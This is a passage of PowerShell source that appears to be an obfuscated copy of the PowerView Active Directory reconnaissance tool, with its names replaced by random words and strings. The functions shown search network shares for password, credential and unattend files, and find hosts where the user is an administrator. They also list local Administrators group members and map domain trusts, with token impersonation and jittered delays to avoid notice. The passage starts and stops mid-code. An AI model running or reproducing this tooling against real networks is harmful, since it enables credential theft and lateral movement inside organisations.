                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
            }
            else {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[irrelevancy] Total number of hosts: $($gzPujpsa99.count)"
            Write-Verbose "[irrelevancy] Delay: $Delay, Jitter: $uQeLHAls99"
            $jsfDIrRy99 = 0
            $uRxBaWtW99 = New-Object System.Random
            ForEach ($kqQkzLHh99 in $gzPujpsa99) {
                $jsfDIrRy99 = $jsfDIrRy99 + 1
                Start-Sleep -Seconds $uRxBaWtW99.Next((1-$uQeLHAls99)*$Delay, (1+$uQeLHAls99)*$Delay)
                Write-Verbose "[irrelevancy] Enumerating server $kqQkzLHh99 ($jsfDIrRy99 of $($gzPujpsa99.count))"
                Invoke-Command -WwGMfZTW99 $avGNuFUJ99 -ArgumentList $kqQkzLHh99, $xJBUPAKE99, $THMRkorV99
            }
        }
        else {
            Write-Verbose "[irrelevancy] Using threading with threads: $InJWRogf99"
            $MceEbqjr99 = @{
                'CheckShareAccess' = $xJBUPAKE99
                'TokenHandle' = $THMRkorV99
            }
            recuperate -iEYVPYCX99 $gzPujpsa99 -WwGMfZTW99 $avGNuFUJ99 -hJnTvHxu99 $MceEbqjr99 -InJWRogf99 $InJWRogf99
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function regulars {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $iEYVPYCX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrQcWRYD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PcddQtAy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cpoQzrSk99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $gosnxdoy99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $qlsvvtLC99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $oyguzKXd99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $wgdxPkMU99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $bDJvyMoe99,
        [String[]]
        $LeOBKAgx99 = @('C$', 'Admin$', 'Print$', 'IPC$'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $WuUAsRWe99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $fCZUtfXv99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $TGZTAUVT99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $RBVDfBvN99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $NiXerRmZ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $uQeLHAls99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $InJWRogf99 = 20
    )
    BEGIN {
        $wyZNUiid99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $wyZNUiid99['Domain'] = $WrQcWRYD99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $wyZNUiid99['LDAPFilter'] = $PcddQtAy99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $wyZNUiid99['SearchBase'] = $cpoQzrSk99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $wyZNUiid99['OperatingSystem'] = $blbEZMhK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $wyZNUiid99['ServicePack'] = $sXOuralh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $wyZNUiid99['SiteName'] = $cgKWGcFU99 }
        if ($PSBoundParameters['Server']) { $wyZNUiid99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $wyZNUiid99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $wyZNUiid99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wyZNUiid99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $wyZNUiid99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $wyZNUiid99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['ComputerName']) {
            $gzPujpsa99 = $iEYVPYCX99
        }
        else {
            Write-Verbose '[regulars] Querying computers in the domain'
            $gzPujpsa99 = beefsteaks @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[regulars] TargetComputers length: $($gzPujpsa99.Length)"
        if ($gzPujpsa99.Length -eq 0) {
            throw '[regulars] No hosts found to enumerate'
        }
        $avGNuFUJ99 = {
            Param($iEYVPYCX99, $wgdxPkMU99, $LeOBKAgx99, $RBVDfBvN99, $IdImphCi99, $NiXerRmZ99, $SHHIwpbe99, $sdyalGJn99)
            if ($sdyalGJn99) {
                $Null = pant -sdyalGJn99 $sdyalGJn99 -Quiet
            }
            ForEach ($kqQkzLHh99 in $iEYVPYCX99) {
                $ngSQTAyq99 = @()
                if ($kqQkzLHh99.StartsWith('\\')) {
                    $ngSQTAyq99 += $kqQkzLHh99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -iEYVPYCX99 $kqQkzLHh99
                    if ($Up) {
                        $fEaPpKQr99 = obligation -iEYVPYCX99 $kqQkzLHh99
                        ForEach ($Share in $fEaPpKQr99) {
                            $UigfMgOQ99 = $Share.Name
                            $Path = '\\'+$kqQkzLHh99+'\'+$UigfMgOQ99
                            if (($UigfMgOQ99) -and ($UigfMgOQ99.Trim() -ne '')) {
                                if ($LeOBKAgx99 -NotContains $UigfMgOQ99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $ngSQTAyq99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $ngSQTAyq99) {
                    Write-Verbose "Searching share: $Share"
                    $SuJUfnUC99 = @{
                        'Path' = $Share
                        'Include' = $wgdxPkMU99
                    }
                    if ($RBVDfBvN99) {
                        $SuJUfnUC99['OfficeDocs'] = $RBVDfBvN99
                    }
                    if ($NiXerRmZ99) {
                        $SuJUfnUC99['FreshEXEs'] = $NiXerRmZ99
                    }
                    if ($WuUAsRWe99) {
                        $SuJUfnUC99['LastAccessTime'] = $WuUAsRWe99
                    }
                    if ($fCZUtfXv99) {
                        $SuJUfnUC99['LastWriteTime'] = $fCZUtfXv99
                    }
                    if ($TGZTAUVT99) {
                        $SuJUfnUC99['CreationTime'] = $TGZTAUVT99
                    }
                    if ($SHHIwpbe99) {
                        $SuJUfnUC99['CheckWriteAccess'] = $SHHIwpbe99
                    }
                    Chernenko @SearchArgs
                }
            }
            if ($sdyalGJn99) {
                mucilage
            }
        }
        $THMRkorV99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
            }
            else {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[regulars] Total number of hosts: $($gzPujpsa99.count)"
            Write-Verbose "[regulars] Delay: $Delay, Jitter: $uQeLHAls99"
            $jsfDIrRy99 = 0
            $uRxBaWtW99 = New-Object System.Random
            ForEach ($kqQkzLHh99 in $gzPujpsa99) {
                $jsfDIrRy99 = $jsfDIrRy99 + 1
                Start-Sleep -Seconds $uRxBaWtW99.Next((1-$uQeLHAls99)*$Delay, (1+$uQeLHAls99)*$Delay)
                Write-Verbose "[regulars] Enumerating server $kqQkzLHh99 ($jsfDIrRy99 of $($gzPujpsa99.count))"
                Invoke-Command -WwGMfZTW99 $avGNuFUJ99 -ArgumentList $kqQkzLHh99, $wgdxPkMU99, $LeOBKAgx99, $RBVDfBvN99, $IdImphCi99, $NiXerRmZ99, $SHHIwpbe99, $THMRkorV99
            }
        }
        else {
            Write-Verbose "[regulars] Using threading with threads: $InJWRogf99"
            $MceEbqjr99 = @{
                'Include' = $wgdxPkMU99
                'ExcludedShares' = $LeOBKAgx99
                'OfficeDocs' = $RBVDfBvN99
                'ExcludeHidden' = $IdImphCi99
                'FreshEXEs' = $NiXerRmZ99
                'CheckWriteAccess' = $SHHIwpbe99
                'TokenHandle' = $THMRkorV99
            }
            recuperate -iEYVPYCX99 $gzPujpsa99 -WwGMfZTW99 $avGNuFUJ99 -hJnTvHxu99 $MceEbqjr99 -InJWRogf99 $InJWRogf99
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function luau {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $iEYVPYCX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrQcWRYD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PcddQtAy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cpoQzrSk99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $gosnxdoy99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $qlsvvtLC99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $oyguzKXd99,
        [Switch]
        $xJBUPAKE99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $uQeLHAls99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $InJWRogf99 = 20
    )
    BEGIN {
        $wyZNUiid99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $wyZNUiid99['Domain'] = $WrQcWRYD99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $wyZNUiid99['LDAPFilter'] = $PcddQtAy99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $wyZNUiid99['SearchBase'] = $cpoQzrSk99 }
        if ($PSBoundParameters['Unconstrained']) { $wyZNUiid99['Unconstrained'] = $vDbTHhCu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $wyZNUiid99['OperatingSystem'] = $blbEZMhK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $wyZNUiid99['ServicePack'] = $sXOuralh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $wyZNUiid99['SiteName'] = $cgKWGcFU99 }
        if ($PSBoundParameters['Server']) { $wyZNUiid99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $wyZNUiid99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $wyZNUiid99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wyZNUiid99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $wyZNUiid99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $wyZNUiid99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['ComputerName']) {
            $gzPujpsa99 = $iEYVPYCX99
        }
        else {
            Write-Verbose '[luau] Querying computers in the domain'
            $gzPujpsa99 = beefsteaks @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[luau] TargetComputers length: $($gzPujpsa99.Length)"
        if ($gzPujpsa99.Length -eq 0) {
            throw '[luau] No hosts found to enumerate'
        }
        $avGNuFUJ99 = {
            Param($iEYVPYCX99, $sdyalGJn99)
            if ($sdyalGJn99) {
                $Null = pant -sdyalGJn99 $sdyalGJn99 -Quiet
            }
            ForEach ($kqQkzLHh99 in $iEYVPYCX99) {
                $Up = Test-Connection -Count 1 -Quiet -iEYVPYCX99 $kqQkzLHh99
                if ($Up) {
                    $odFKMVxt99 = neoclassicism -iEYVPYCX99 $kqQkzLHh99
                    if ($odFKMVxt99.IsAdmin) {
                        $kqQkzLHh99
                    }
                }
            }
            if ($sdyalGJn99) {
                mucilage
            }
        }
        $THMRkorV99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
            }
            else {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[luau] Total number of hosts: $($gzPujpsa99.count)"
            Write-Verbose "[luau] Delay: $Delay, Jitter: $uQeLHAls99"
            $jsfDIrRy99 = 0
            $uRxBaWtW99 = New-Object System.Random
            ForEach ($kqQkzLHh99 in $gzPujpsa99) {
                $jsfDIrRy99 = $jsfDIrRy99 + 1
                Start-Sleep -Seconds $uRxBaWtW99.Next((1-$uQeLHAls99)*$Delay, (1+$uQeLHAls99)*$Delay)
                Write-Verbose "[luau] Enumerating server $kqQkzLHh99 ($jsfDIrRy99 of $($gzPujpsa99.count))"
                Invoke-Command -WwGMfZTW99 $avGNuFUJ99 -ArgumentList $kqQkzLHh99, $THMRkorV99
            }
        }
        else {
            Write-Verbose "[luau] Using threading with threads: $InJWRogf99"
            $MceEbqjr99 = @{
                'TokenHandle' = $THMRkorV99
            }
            recuperate -iEYVPYCX99 $gzPujpsa99 -WwGMfZTW99 $avGNuFUJ99 -hJnTvHxu99 $MceEbqjr99 -InJWRogf99 $InJWRogf99
        }
    }
}
function fantasies {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $iEYVPYCX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrQcWRYD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PcddQtAy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cpoQzrSk99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $gosnxdoy99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $qlsvvtLC99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $oyguzKXd99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $PnKWBocM99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $nFyaxSAK99 = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $uQeLHAls99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $InJWRogf99 = 20
    )
    BEGIN {
        $wyZNUiid99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $wyZNUiid99['Domain'] = $WrQcWRYD99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $wyZNUiid99['LDAPFilter'] = $PcddQtAy99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $wyZNUiid99['SearchBase'] = $cpoQzrSk99 }
        if ($PSBoundParameters['Unconstrained']) { $wyZNUiid99['Unconstrained'] = $vDbTHhCu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $wyZNUiid99['OperatingSystem'] = $blbEZMhK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $wyZNUiid99['ServicePack'] = $sXOuralh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $wyZNUiid99['SiteName'] = $cgKWGcFU99 }
        if ($PSBoundParameters['Server']) { $wyZNUiid99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $wyZNUiid99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $wyZNUiid99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wyZNUiid99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $wyZNUiid99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $wyZNUiid99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['ComputerName']) {
            $gzPujpsa99 = $iEYVPYCX99
        }
        else {
            Write-Verbose '[fantasies] Querying computers in the domain'
            $gzPujpsa99 = beefsteaks @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[fantasies] TargetComputers length: $($gzPujpsa99.Length)"
        if ($gzPujpsa99.Length -eq 0) {
            throw '[fantasies] No hosts found to enumerate'
        }
        $avGNuFUJ99 = {
            Param($iEYVPYCX99, $PnKWBocM99, $nFyaxSAK99, $sdyalGJn99)
            if ($PnKWBocM99 -eq "Administrators") {
                $AHzyrMZg99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $PnKWBocM99 = ($AHzyrMZg99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if ($sdyalGJn99) {
                $Null = pant -sdyalGJn99 $sdyalGJn99 -Quiet
            }
            ForEach ($kqQkzLHh99 in $iEYVPYCX99) {
                $Up = Test-Connection -Count 1 -Quiet -iEYVPYCX99 $kqQkzLHh99
                if ($Up) {
                    $ebpajpSZ99 = @{
                        'ComputerName' = $kqQkzLHh99
                        'Method' = $nFyaxSAK99
                        'GroupName' = $PnKWBocM99
                    }
                    madden @NetLocalGroupMemberArguments
                }
            }
            if ($sdyalGJn99) {
                mucilage
            }
        }
        $THMRkorV99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
            }
            else {
                $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[fantasies] Total number of hosts: $($gzPujpsa99.count)"
            Write-Verbose "[fantasies] Delay: $Delay, Jitter: $uQeLHAls99"
            $jsfDIrRy99 = 0
            $uRxBaWtW99 = New-Object System.Random
            ForEach ($kqQkzLHh99 in $gzPujpsa99) {
                $jsfDIrRy99 = $jsfDIrRy99 + 1
                Start-Sleep -Seconds $uRxBaWtW99.Next((1-$uQeLHAls99)*$Delay, (1+$uQeLHAls99)*$Delay)
                Write-Verbose "[fantasies] Enumerating server $kqQkzLHh99 ($jsfDIrRy99 of $($gzPujpsa99.count))"
                Invoke-Command -WwGMfZTW99 $avGNuFUJ99 -ArgumentList $kqQkzLHh99, $PnKWBocM99, $nFyaxSAK99, $THMRkorV99
            }
        }
        else {
            Write-Verbose "[fantasies] Using threading with threads: $InJWRogf99"
            $MceEbqjr99 = @{
                'GroupName' = $PnKWBocM99
                'Method' = $nFyaxSAK99
                'TokenHandle' = $THMRkorV99
            }
            recuperate -iEYVPYCX99 $gzPujpsa99 -WwGMfZTW99 $avGNuFUJ99 -hJnTvHxu99 $MceEbqjr99 -InJWRogf99 $InJWRogf99
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function interjects {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $yvblwQRl99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }
        $eialgore99 = @{}
        if ($PSBoundParameters['Domain']) { $eialgore99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $eialgore99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['Properties']) { $eialgore99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $eialgore99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $eialgore99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $eialgore99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $eialgore99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $eialgore99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $eialgore99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $eialgore99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $nHGOGFxy99 = @{}
            if ($CmuysoGL99 -and $CmuysoGL99.Trim() -ne '') {
                $DPHZELvY99 = $CmuysoGL99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $DPHZELvY99 = (rompers -QWHERWHL99 $QWHERWHL99).Name
                }
                else {
                    $DPHZELvY99 = (rompers).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($CmuysoGL99 -and $CmuysoGL99.Trim() -ne '') {
                $DPHZELvY99 = $CmuysoGL99
            }
            else {
                $DPHZELvY99 = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $lXlOlxlI99 = squintest @LdapSearcherArguments
            $qjeUEcwc99 = gelid @NetSearcherArguments
            if ($lXlOlxlI99) {
                $lXlOlxlI99.Filter = '(objectClass=trustedDomain)'
                if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $lXlOlxlI99.FindOne() }
                else { $IUnNdChl99 = $lXlOlxlI99.FindAll() }
                $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $JxkLuZvM99 = New-Object PSObject
                    $fqZcUuhe99 = @()
                    $fqZcUuhe99 += $yvblwQRl99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $yvblwQRl99[$_] }
                    $PJOIHDfB99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $SXdgercn99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }
                    $pBkTODOT99 = $Props.distinguishedname[0]
                    $XxeSUWOi99 = $pBkTODOT99.IndexOf('DC=')
                    if ($XxeSUWOi99) {
                        $DPHZELvY99 = $($pBkTODOT99.SubString($XxeSUWOi99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $DPHZELvY99 = ""
                    }
                    $jOaIMjHw99 = $pBkTODOT99.IndexOf(',CN=System')
                    if ($XxeSUWOi99) {
                        $cELjQvSA99 = $pBkTODOT99.SubString(3, $jOaIMjHw99-3)
                    }
                    else {
                        $cELjQvSA99 = ""
                    }
                    $QoYVfVOx99 = New-Object Guid @(,$Props.objectguid[0])
                    $vwZZtFNK99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $JxkLuZvM99 | Add-Member Noteproperty 'SourceName' $DPHZELvY99
                    $JxkLuZvM99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $JxkLuZvM99 | Add-Member Noteproperty 'TrustType' $SXdgercn99
                    $JxkLuZvM99 | Add-Member Noteproperty 'TrustAttributes' $($fqZcUuhe99 -join ',')
                    $JxkLuZvM99 | Add-Member Noteproperty 'TrustDirection' "$PJOIHDfB99"
                    $JxkLuZvM99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $JxkLuZvM99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $JxkLuZvM99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $JxkLuZvM99
                }
                if ($IUnNdChl99) {
                    try { $IUnNdChl99.dispose() }
                    catch {
                        Write-Verbose "[interjects] Error disposing of the Results object: $_"
                    }
                }
                $lXlOlxlI99.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $bfYHERMb99 = $vbyFupaI99
            }
            elseif ($CmuysoGL99 -and $CmuysoGL99.Trim() -ne '') {
                $bfYHERMb99 = $CmuysoGL99
            }
            else {
                $bfYHERMb99 = $Null
            }
